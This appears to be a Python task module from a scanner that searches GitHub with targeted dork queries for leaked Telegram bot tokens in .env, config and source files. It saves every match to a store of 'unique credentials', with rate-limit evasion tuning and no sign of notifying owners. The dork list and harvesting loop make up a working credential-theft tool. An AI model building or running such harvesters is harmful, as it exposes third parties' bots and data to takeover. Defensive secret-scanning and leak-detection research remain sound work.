"""Scanner task implementations for github."""

from ..common import *


@app.task(name="scanner.scan_github")
def scan_github(query: str = None):
    return _run_sync(_scan_github_async(query))

async def _scan_github_async(query: str = None):
    # High-signal dorks only. Ordered by expected yield:
    # 1. .env files with explicit var names — fewest false positives
    # 2. Config files — moderate signal
    # 3. Direct api.telegram.org/bot in source by extension — higher volume, lower precision
    #
    # Removed:
    # - language:python/js/php/go patterns → too broad, GitHub secondary rate-limits on these fast
    # - Generic "https://api.telegram.org/bot" without filename anchor → enormous result sets, slow
    # - Duplicate token var names that resolve to same result pool
    #
    # GITHUB_DORK_CAP (env, default 10): max dorks per run. Increase carefully.
    # GITHUB_QUERY_SLEEP (env, default 8): seconds between queries.
    # Both exist so you can tune without code changes.
    default_dorks = [
        # Tier 1 — highest precision: explicit var name in .env files
        'filename:.env "TELEGRAM_BOT_TOKEN"',
        'filename:.env "TG_BOT_TOKEN"',
        'filename:.env "BOT_TOKEN"',
        # Tier 2 — config files
        'filename:config.json "bot_token"',
        'filename:docker-compose.yml "TELEGRAM_BOT_TOKEN"',
        'filename:.env.production "TELEGRAM"',
        'filename:.env.local "TELEGRAM"',
        # Tier 3 — direct token pattern in source, scoped by extension
        '"api.telegram.org/bot" extension:py',
        '"api.telegram.org/bot" extension:js',
        '"api.telegram.org/bot" extension:php',
    ]

    DORK_CAP = int(os.getenv("GITHUB_DORK_CAP", 10))  # noqa: N806 — function-scoped constant
    QUERY_SLEEP = float(os.getenv("GITHUB_QUERY_SLEEP", 8))  # noqa: N806 — function-scoped constant

    queries = [query] if query else default_dorks[:DORK_CAP]

    total_saved = 0
    errors = []

    # Check Pause State
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GitHub] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (cap={DORK_CAP}, sleep={QUERY_SLEEP}s)...")
    await _send_log_async(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")

    # Code search has no pushed-date qualifier, so the service filters matches
    # using repository push dates from this rolling cutoff.
    pushed_since = github.recent_push_cutoff()

    for q in queries:
        logger.info(f"    🔎 [GitHub] Dorking: {q}")
        try:
            results = await _cb("github").call(github.search)(q, pushed_since=pushed_since)
            logger.info(f"    ✅ [GitHub] Dork returned {len(results)} matches.")

            saved = await _save_credentials_async(results, "github")
            total_saved += saved

        except Exception as e:
            err_str = str(e)
            logger.error(f"    ❌ [GitHub] Dork failed: {err_str}")
            errors.append(err_str)
            errors = errors[-MAX_ERRORS_BUFFER:]
            # Secondary rate limit — back off harder
            if "secondary" in err_str.lower() or "rate limit" in err_str.lower():
                logger.warning("    ⏳ [GitHub] Secondary rate limit hit — sleeping 60s")
                await asyncio.sleep(60)
                continue

        await asyncio.sleep(QUERY_SLEEP)

    if errors:
        logger.warning(f"⚠️ [GitHub] Completed with {len(errors)} errors.")

    result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
    if errors:
        result_msg += f" (Encountered {len(errors)} errors)"
    await _send_log_async(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
    return result_msg
